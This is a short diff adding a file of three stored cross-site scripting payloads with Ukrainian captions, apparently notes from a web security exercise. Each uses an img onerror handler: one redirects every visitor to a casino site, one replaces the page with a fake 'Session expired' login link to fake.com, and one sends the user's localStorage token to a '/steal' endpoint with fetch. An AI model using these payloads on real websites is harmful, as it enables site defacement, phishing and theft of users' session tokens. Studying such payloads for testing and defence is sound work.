@@ -1,0 +1,8 @@
+перехід на сайт казино (головна сторінка взагалі нікому недоступна):
+<img src="x" onerror="window.location='https://beton.ua/'" />
+
+омана і перехід на інший сайт користувачем самостійно (головна сторінка недоступна):
+<img src="x" onerror=" document.body.innerHTML='<h2>Session expired</h2><a href=https://fake.com>Login again</a>' " />
+
+відправка токена користувача на сервер:
+<img src="x" onerror=" fetch('http://localhost:4000/steal?token=' + localStorage.getItem('token')) " />
